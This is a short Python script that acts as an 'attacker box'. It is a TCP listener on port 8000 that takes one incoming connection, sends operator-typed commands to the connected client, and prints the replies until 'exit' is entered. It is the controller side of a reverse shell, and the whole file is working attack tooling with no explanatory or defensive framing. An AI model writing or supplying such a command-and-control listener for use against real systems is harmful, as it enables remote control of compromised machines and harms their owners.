from socket import *

def main():
    serverPort = 8000
    serverSocket = socket(AF_INET, SOCK_STREAM)

    # Allow reusing the same address
    serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    serverSocket.bind(('', serverPort))
    serverSocket.listen(1)
    print("Attacker box listening and awaiting instructions")

    try:
        connectionSocket, addr = serverSocket.accept()
        print("Thanks for connecting to me " + str(addr))

        # Receive initial message from the client
        message = connectionSocket.recv(1024).decode()
        print(f"Received: {message}")

        command = ""
        while command.strip().lower() != "exit":
            try:
                # Input command
                command = input("Please enter a command: ").strip()
                connectionSocket.send(command.encode())

                # Receive response from the client
                response = connectionSocket.recv(1024).decode()
                print(f"Response: {response}")

            except Exception as e:
                print(f"Error during communication: {e}")
                break

    except Exception as e:
        print(f"Server error: {e}")

    finally:
        # Close the connection
        print("Closing connection.")
        connectionSocket.shutdown(SHUT_RDWR)
        connectionSocket.close()
        serverSocket.close()

if __name__ == "__main__":
    main()
